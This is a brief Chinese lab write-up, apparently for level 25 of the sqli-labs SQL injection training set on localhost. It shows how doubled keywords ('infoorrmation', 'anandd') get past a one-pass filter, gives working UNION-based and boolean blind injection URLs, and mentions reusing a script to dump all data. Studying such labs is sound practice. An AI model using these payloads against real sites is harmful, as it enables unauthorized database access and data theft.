# Lesson-25
```
Bool盲注-,-双写绕过-,-明注
```

本题主要是通过双写来绕过一次性的关键字替换
---
明注
http://127.0.0.1/Less-25/?id=0%27union%20select%201,group_concat(schema_name),3%20from%20infoorrmation_schema.schemata--+

---
盲注

```
http://127.0.0.1/Less-25/?id=1%27%20anandd%201--+
http://127.0.0.1/Less-25/?id=1%27%20anandd%20()--+
```
修改之前关卡的脚本利用盲注即可dump出所有数据
